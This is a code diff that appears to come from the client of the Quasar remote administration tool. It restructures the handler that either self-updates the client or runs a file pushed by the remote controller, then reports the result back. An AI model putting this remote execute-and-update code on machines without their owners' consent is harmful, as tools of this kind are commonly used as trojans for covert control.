@@ -1,6 +1,6 @@
 ﻿using Quasar.Client.Networking;
 using Quasar.Client.Setup;
-using Quasar.Client.Utilities;
+using Quasar.Common;
 using Quasar.Common.Enums;
 using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
@@ -97,20 +97,23 @@ namespace Quasar.Client.Messages
                     }
                 }
 
-                try
+                if (message.IsUpdate)
                 {
-                    if (message.IsUpdate)
+                    try
                     {
-                        if (ClientUpdater.Update(client, filePath))
-                        {
-                            _client.Exit();
-                        }
-                        else
-                        {
-                            throw new Exception("Update failed");
-                        }
+                        var clientUpdater = new ClientUpdater();
+                        clientUpdater.Update(filePath); 
+                        _client.Exit();
                     }
-                    else
+                    catch (Exception ex)
+                    {
+                        NativeMethods.DeleteFile(filePath);
+                        client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
+                    }
+                }
+                else
+                {
+                    try
                     {
                         ProcessStartInfo startInfo = new ProcessStartInfo
                         {
@@ -118,12 +121,13 @@ namespace Quasar.Client.Messages
                             FileName = filePath
                         };
                         Process.Start(startInfo);
+                        client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = true});
                     }
-                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
-                }
-                catch
-                {
-                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                    catch (Exception)
+                    {
+                        client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
+                    }
+
                 }
             }).Start();
         }
